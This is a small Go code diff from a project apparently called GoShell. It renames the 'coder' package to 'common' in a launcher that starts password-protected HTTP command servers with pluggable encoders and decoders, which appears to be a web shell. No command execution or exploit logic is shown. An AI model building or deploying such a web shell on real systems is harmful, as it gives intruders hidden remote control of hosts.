@@ -4,7 +4,7 @@ import (
 	"flag"
 	"net/http"
 
-	"github.com/Wd0g/GoShell/lib/coder"
+	"github.com/Wd0g/GoShell/lib/common"
 
 	"github.com/Wd0g/GoShell/lib/server"
 
@@ -35,16 +35,16 @@ func main() {
 	case "cmd":
 		handler := server.Cmd{
 			Pwd:     *webPwd,
-			Decoder: coder.NewDecoder(*webDecoder),
-			Encoder: coder.NewEncoder(*webEncoder),
+			Decoder: common.NewDecoder(*webDecoder),
+			Encoder: common.NewEncoder(*webEncoder),
 		}
 		http.ListenAndServe(*webAddr, handler)
 
 	case "custom":
 		handler := server.Custom{
 			Pwd:     *webPwd,
-			Decoder: coder.NewDecoder(*webDecoder),
-			Encoder: coder.NewEncoder(*webEncoder),
+			Decoder: common.NewDecoder(*webDecoder),
+			Encoder: common.NewEncoder(*webEncoder),
 		}
 		http.ListenAndServe(*webAddr, handler)
 	}
